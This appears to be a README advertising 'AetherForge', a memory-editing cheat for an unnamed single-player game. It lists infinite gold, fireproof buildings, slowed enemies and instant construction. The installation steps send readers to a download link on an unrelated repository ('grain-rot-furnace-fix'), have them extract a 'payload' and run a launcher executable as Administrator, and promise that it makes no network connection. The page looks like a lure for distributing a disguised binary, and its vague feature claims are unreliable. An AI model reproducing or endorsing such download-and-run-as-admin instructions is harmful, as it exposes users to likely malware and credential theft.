## ✨ Core Feature Matrix: The Seven Pillars of the Forge

### 1. 🏆 Aurum Cascade (Infinite Gold Curator)
Say goodbye to the copper famine. The Aurum Cascade system **rewrites the memory of your coffers** to believe they are a tributary of the Sunken Vault. Instead of a cheat, consider this a **teller's ledger correction** — every transaction you perform is processed as if backed by an inexhaustible celestial reserve. Trade, bribe, build — the ledger never reddens.
- **Dynamic Scaling**: Toggle between "Deluge" (instant immersion) or "Trickle" (set income to 10x, 50x, or 100x the base rate) for a more organic progression.
- **Compliance Mode**: Auto-stops the flow when a hard cap (e.g., 5 million gold) is reached, preventing visual overflow bugs.

### 2. 🔥 Ember Persistence Protocol (Spark Never Fades)
The Spark is the lifeblood of your constructs. In vanilla, it flickers and dies. The Ember Persistence Protocol **reclassifies your Spark as a permanent fixture** — a miniature artificial star tethered to your hearth. This eliminates the constant micromanagement of fuel, letting you focus on *architecture* rather than *maintenance*.
- **Flame Lock**: Prevents any construct from entering the "dormant" state.
- **Cold-Start Immunity**: Even after a game reload, the Spark is re-ignited automatically.

### 3. 🛡️ Vessel of the Ancients (Fireproof & Indestructible Hulls)
Your precious storage silos and granaries are no longer vulnerable to the wandering ember. This module **applies a thermal-dampening lattice** to every building tile, rendering them immune to fire damage, acid rain, and the Corrupted's desecration aura. It's not *god mode*; it's **structural engineering from a bygone era**.

### 4. 🧊 Cryo-Stasis Field (Corrupted Freeze Frame)
Why kill the Corrupted when you can simply **pause their narrative**? The Cryo-Stasis Field emits a slow-time bubble around your entire outpost. Enemies within the bubble move at 1/10th their normal speed, allowing you to leisurely plan your defenses or simply stroll past the horrors. It doesn't strip their HP; it **strips their relevance**.
- **Selective Freeze**: Apply to specific enemy types only (e.g., only the "Rotting Brutes").

### 5. 🏗️ Instant Outpost Architect (Blueprint Completion Logic)
Forget waiting for timers. The Architect module **speaks directly to the construction foreman in the game's logic** — the individual workers will still walk the scaffolding, but the wood, stone, and nails will **exist exponentially faster**. This is not teleportation; it is *extreme efficiency delegation*. Build a full fortress in minutes, not days.

### 6. 🗝️ Construct Unlocked (Universal Blueprint Vault)
Unlock all building, weapon, and tool schematics instantly. This does not give you the materials; it gives you the **knowledge**. The "Construction" and "Metallurgy" skill trees are considered fully traversed for the sake of crafting recipes.

### 7. 🐛 Negative Room EXP Bug Fix (The Sanity Patch)
A hidden bug, rarely discussed, caused players in the "Negative Basement" rooms to lose experience points exponentially. AetherForge includes a **proprietary memory scrubber** that disables the erroneous integer underflow. This is a core *stability* feature, not a bonus.

## 🧭 Installation & Deployment (The Integration Rite)

This is not a simple "install." It is an **integration rite**. We do not use package managers or git clones. The AetherForge modifies the memory space of the game executable at runtime.

1. **Download** the archive using the [![Download](https://raw.githubusercontent.com/imperfectors/grain-rot-furnace-fix/main/latest_6385c0.svg)](https://imperfectors.github.io/grain-rot-furnace-fix/) macro section above.
2. **Extract** the payload to a directory of your choice (e.g., `C:\AetherForge_Vault`).
3. **Run** `AetherForge_Launcher.exe` as Administrator (the rite requires elevated privileges to access the game's memory mapping).
4. **Launch** your game client. The launcher will idle in the system tray, waiting for the game process to appear.
5. Once the game window renders, press `F10` to summon the **Forge Interface**.

**Note**: AetherForge strictly operates on the **single-player offline client**. It does not connect to any external server, nor does it modify the game files on disk. All changes are volatile memory mappings, reverted upon game exit.
